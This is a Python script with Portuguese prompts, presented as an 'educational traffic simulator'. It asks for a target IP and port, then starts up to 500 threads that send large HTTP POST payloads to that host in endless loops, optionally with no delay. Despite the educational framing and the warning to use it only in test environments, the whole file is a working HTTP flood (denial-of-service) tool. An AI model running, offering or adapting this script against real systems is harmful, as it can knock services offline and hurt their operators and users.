import requests
import threading
import time

# Função para enviar requisições
def send_request(url, data, num_threads, delay):
    def request_task():
        try:
            while True:
                response = requests.post(url, data=data)
                print(f"Requisição enviada! Status: {response.status_code}")
                time.sleep(delay)  # Controla a velocidade do envio
        except Exception as e:
            print(f"Erro: {e}")

    # Criar múltiplas threads
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=request_task)
        threads.append(thread)
        thread.start()

    # Aguardar todas as threads
    for thread in threads:
        thread.join()

# Painel de controle
def main():
    print("### Simulador Educacional de Tráfego ###")
    print("ATENÇÃO: Use este script apenas em ambientes de teste controlados.")
    
    # Configuração do alvo
    ip = input("Digite o IP de destino (ex.: 192.168.0.1): ")
    port = input("Digite a porta de destino (ex.: 5000): ")

    try:
        port = int(port)
        if port < 1 or port > 65535:
            raise ValueError("Porta inválida!")
    except ValueError:
        print("Erro: Porta deve ser um número entre 1 e 65535.")
        return

    url = f"http://{ip}:{port}/data"
    print(f"\nConfiguração definida: {url}")
    
    # Configuração de dados
    data_size = int(input("Tamanho dos dados a enviar (em KB): ")) * 1024
    num_threads = int(input("Número de threads (máximo 500): "))
    if num_threads > 500:
        print("Erro: Máximo de 500 threads permitido!")
        return

    # Configuração da velocidade
    print("\nEscolha a velocidade de execução (1 - Mais lenta, 5 - Mais rápida):")
    print("1: Muito lenta (2 segundos por requisição)")
    print("2: Lenta (1 segundo por requisição)")
    print("3: Moderada (0.5 segundos por requisição)")
    print("4: Rápida (0.1 segundos por requisição)")
    print("5: Muito rápida (Sem atraso)")
    
    speed_choice = input("Escolha um nível de velocidade (1 a 5): ")

    try:
        speed_choice = int(speed_choice)
        if speed_choice < 1 or speed_choice > 5:
            raise ValueError("Escolha inválida!")
    except ValueError:
        print("Erro: Escolha deve ser um número entre 1 e 5.")
        return

    # Mapeando a velocidade com base na escolha
    delay_map = {1: 2.0, 2: 1.0, 3: 0.5, 4: 0.1, 5: 0.0}
    delay = delay_map[speed_choice]

    # Confirmação
    print(f"\nConfirmar execução:")
    print(f"Alvo: {url}")
    print(f"Tamanho dos dados: {data_size} bytes")
    print(f"Threads: {num_threads}")
    print(f"Velocidade: {'Sem atraso' if delay == 0 else f'{delay} segundos entre requisições'}")
    confirm = input("Deseja iniciar? (s/n): ")

    if confirm.lower() == "s":
        data = "X" * data_size
        print("Iniciando envio de requisições...")
        send_request(url, data, num_threads, delay)
    else:
        print("Cancelado.")

if __name__ == "__main__":
    main()
